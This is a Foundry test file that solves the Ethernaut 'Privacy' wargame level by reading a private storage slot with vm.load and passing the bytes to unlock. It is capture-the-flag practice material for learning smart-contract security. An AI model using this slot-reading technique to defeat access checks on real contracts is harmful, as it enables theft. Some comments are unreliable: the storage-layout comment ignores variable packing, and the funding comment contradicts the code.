// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/12-Privacy/PrivacyFactory.sol';
import '../core/Ethernaut.sol';

contract PrivacyTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 100 ether); // fund our attacker contract with 1 ether
  }

  function testPrivacyHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------

    PrivacyFactory privacyFactory = new PrivacyFactory();
    ethernaut.registerLevel(privacyFactory);
    vm.startPrank(attacker);
    address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(
      privacyFactory
    );
    Privacy privacyContract = Privacy(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    // Loads a storage slot from an address (who, slot)
    // Slot # depends on contract storage layout, e.g:
    // > Privacy.sol:
    // -----------------------------
    // 0 - bool public locked = true;
    // 1 - uint256 public ID = block.timestamp;
    // 2 - uint8 private flattening = 10;
    // 3 - uint8 private denomination = 255;
    // 4 - uint16 private awkwardness = uint16(block.timestamp); // now has been deprecated
    // 5 - bytes32[3] private data;
    bytes32 data = vm.load(levelAddress, bytes32(uint256(5)));
    emit log_bytes32(data);
    privacyContract.unlock(bytes16(data));

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}
